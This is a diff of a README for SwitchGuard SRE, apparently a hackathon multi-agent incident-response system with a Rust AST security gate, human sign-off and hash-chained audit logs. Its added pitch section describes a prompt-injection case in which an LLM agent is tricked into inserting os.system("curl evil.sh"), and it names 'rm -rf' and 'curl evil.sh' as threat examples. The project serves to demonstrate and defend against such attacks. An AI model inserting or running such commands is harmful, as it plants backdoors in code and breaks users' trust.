@@ -2,45 +2,39 @@
 
 [![Track](https://img.shields.io/badge/Hackathon-Flip_the_Switch_2026-orange)](https://www.wemakedevs.org/hackathons/switch)
 [![Track 01](https://img.shields.io/badge/Track_01-Best_Business_Workflow-blue)](#)
-[![CI / 7-Layer Test Suite](https://github.com/Anshulkaocde123/switchguard-sre/actions/workflows/ci.yml/badge.svg)](https://github.com/Anshulkaocde123/switchguard-sre/actions/workflows/ci.yml)
+[![CI / 7-Layer Test Suite](https://github.com/Anshulkaocde123/switchguard-sre/actions/workflows/switchguard-ci.yml/badge.svg)](https://github.com/Anshulkaocde123/switchguard-sre/actions/workflows/switchguard-ci.yml)
 [![Live Dashboard](https://img.shields.io/badge/Live_Dashboard-GitHub_Pages-brightgreen?logo=github)](https://anshulkaocde123.github.io/switchguard-sre/)
+[![Rust 1.75+](https://img.shields.io/badge/Rust-1.75%2B_LTO_Binary-DEA584?logo=rust)](#)
+[![Scrub Latency p95](https://img.shields.io/badge/Scrub_Latency_p95-8.55ms-blue)](#)
+[![Concurrency 32 Workers](https://img.shields.io/badge/Concurrency-32_Workers_0_Corruption-00C853)](#)
 [![Audit Chain](https://img.shields.io/badge/Audit_Chain-Cryptographically_Verified-00C853?logo=rust)](#)
 [![AST Guardrails](https://img.shields.io/badge/AST_Guardrails-10%2F10_Enforced-blue)](#)
-[![Upstream Switch PRs](https://img.shields.io/badge/Upstream_Switch_PRs-%23827_%7C_%23837-orange)](#)
+[![Upstream Switch PRs](https://img.shields.io/badge/Upstream_Switch_PRs-%23827_Supabase_%7C_%23837_Trello-orange)](https://github.com/sandbox-quantum/switch/pulls)
 
 > **SwitchGuard SRE** is a hybrid Rust + Python autonomous incident response war room running on **Switch Console**, **Mattermost**, and **Google Antigravity ACP**. Hardened for 1,000,000+ alert storms and high concurrency, it transforms fragmented incident firefighting into an automated, permission-isolated multi-agent workflow under strict out-of-band AST security guardrails, O(1) deduplication, episodic runbook memory, and human-in-the-loop authorization.
 
-🔗 **Live Hosted Dashboard:** [https://anshulkaocde123.github.io/switchguard-sre/](https://anshulkaocde123.github.io/switchguard-sre/)
+🔗 **Live Hosted Dashboard:** [https://anshulkaocde123.github.io/switchguard-sre/](https://anshulkaocde123.github.io/switchguard-sre/)  
+📦 **Monorepo Architecture:** `Anshulkaocde123/switchguard-sre` is the complete, self-contained primary repository containing the Rust CLI, telemetry engine, release audit chain, and target app. The target microservice is also mirrored standalone at [Anshulkaocde123/switchguard-sandbox-app](https://github.com/Anshulkaocde123/switchguard-sandbox-app).
 
 ---
 
-## Architecture & War Room Workflow
+## 30-Second Video Pitch Structure (Hook + Adversarial Proof)
 
-```mermaid
-flowchart TD
-    A[Production Crash / Raw Telemetry Alert] -->|Raw Logs with PII & Secrets| B[sre-sentinel: /workspace/telemetry]
-    B -->|switchguard-cli scrub: <0.5ms O 1 Dedup| C[Sanitized Incident Record + HMAC Redactions]
-    C -->|incidents_ledger.md: POSIX flock + fsync| D[Reproduction Dispatch]
-    D -->|Sanitized Parameters + Runbook Pattern| E[sre-repro: /workspace/sandbox-app]
-    E -->|Step 1: Write Failing Test| F[pytest: test_cart.py]
-    F -->|Step 2: Apply Surgical Patch <=25 lines| G[Patch cart_service.py]
-    G -->|Step 3: Native Rust AST Security Gate| H[switchguard-cli verify-diff .]
-    H -->|Verified AST Scorecard AST-SEC-00..09| I[Incident Commander / Human SRE]
-    I -->|Explicit 'Approved' Gate| J[sre-clerk: /workspace/release-ops]
-    J -->|cut_release.py| K[Hotfix Release, Patch Artifact & TEE Attestation]
-    K -->|SHA-256 Hash Chaining from Genesis| L[RELEASE_AUDIT.log + Live HTML Dashboard]
-```
+1. **0:00 - 0:15 (The Critical Problem):** Autonomous AI agents leak PII and can be prompt-injected into running destructive bash commands or backdoors (`rm -rf`, `curl evil.sh`).
+2. **0:15 - 0:45 (The Autonomous Solution):** A live crash fires (`INC-8041`). The 3-agent war room (`sre-sentinel` $\rightarrow$ `sre-repro` $\rightarrow$ `sre-clerk`) scrubs PII in `<0.5ms`, writes a failing reproduction test, surgically patches the bug in 15 seconds, and enforces human-in-the-loop sign-off.
+3. **0:45 - 1:15 (Live Adversarial Red-Team Proof):** A hacker embeds a prompt-injection payload (`INC-8043`). The LLM agent is tricked into inserting `os.system("curl evil.sh")`, but **`switchguard-cli` out-of-band Rust AST gate immediately intercepts and blocks the attack live on screen (`AST-SEC-02: NO_OS_SYSTEM`)!**
+4. **1:15 - 1:45 (Auditability & Compliance):** Showing the SHA-256 hash-chained release ledger, hardware TEE attestation, and live executive dashboard.
 
 ---
 
-## Sponsor Alignment & Upstream Switch Contributions
+## Ecosystem Contributions to Switch (Upstream PRs)
 
-SwitchGuard SRE was engineered specifically for the **Switch Console & Google Antigravity ACP** ecosystem, adhering to strict multi-agent room topologies, directory isolation, and permission-gated communication scopes. During development, our team identified and submitted upstream fixes to the Switch repository:
+Unlike projects that merely consume an SDK, SwitchGuard SRE actively contributed back to the official [sandbox-quantum/switch](https://github.com/sandbox-quantum/switch) repository to harden multi-agent incident management:
 
-* **Switch Upstream PR #827 (Room Document Synchronization in Bridged Mattermost):**
-  Resolved a critical synchronization edge case where room documents were invisible to external chat bridges. SwitchGuard SRE implements full in-thread Markdown tables, unified diffs, and terminal tracebacks directly to preserve complete chat visibility.
-* **Switch Upstream PR #837 (ACP Message Splitting & Traceback Length Cap):**
-  Fixed terminal traceback fragmentation where logs >30 lines triggered unwanted message splitting. SwitchGuard SRE enforces strict log compaction (<=30 lines, <1,500 chars) ensuring crisp delivery in Switch room channels.
+* **Switch Upstream PR #827 (Supabase Connector & Bridged Chat Document Sync):**
+  Resolved a critical synchronization edge case (Issue #1097) where room documents were invisible to external chat bridges like Mattermost. SwitchGuard SRE formats all status scorecards, Markdown tables, pytest outputs, and unified git diffs directly in-thread to preserve complete audit visibility.
+* **Switch Upstream PR #837 (Trello Connector & ACP Message Splitting Mitigation):**
+  Fixed terminal traceback fragmentation (Issue #1226) where logs >30 lines triggered unwanted message splitting across ACP channels. SwitchGuard SRE enforces strict log compaction (<=30 lines, <1,500 chars) ensuring crisp delivery.
 * **Switch 0.31+ Room Template Integration:**
   Packaged with `switchguard-sre.template.yaml` for 1-click instantiation of all 3 permission-isolated agent personas (`sre-sentinel`, `sre-repro`, `sre-clerk`) with tailored file scopes and tool permissions.
 
@@ -211,31 +205,31 @@ Output:
 SwitchGuard SRE includes a master `Makefile` for instant evaluation:
 
 ```bash
-# Display colored command catalog
-make help
+# 1. Build Rust AST & Security CLI with LTO optimizations
+make build
 
-# 1. Reset sandbox to clean state (<2 seconds)
-make setup
+# 2. Reset sandbox to clean state (<2 seconds)
+make reset
 
-# 2. Run unit tests on sandbox-app (26 tests)
+# 3. Run full 28-assertion 7-layer verification mega suite
 make test
 
-# 3. Run full 7-Layer Verification Mega Suite (28 red-team tests)
-make test-suite
+# 4. Demonstrate live prompt-injection attack & AST-SEC-02 block (INC-8043)
+make attack-demo
 
-# 4. Run Red-Team Security Chaos Drills (including prompt injection trap)
-make chaos
-
-# 5. Verify Cryptographic SHA-256 Audit Hash Chain
+# 5. Verify Cryptographic SHA-256 Audit Hash Chain in 1 command
 make audit
 
-# 6. Fire all 3 incident scenarios sequentially
-make simulate
+# 6. Run unit tests on sandbox-app (28 tests)
+make test-unit
 
-# 7. Launch Interactive Telemetry Crash Simulator
+# 7. Run Red-Team Security Chaos Drills (Scenarios 1-5)
+make chaos
+
+# 8. Launch Interactive Judge Incident Simulator
 make demo
 
-# 8. Serve Live HTML Dashboard locally on port 8000
+# 9. Serve Live HTML Dashboard locally on port 8000
 make serve
 ```
 
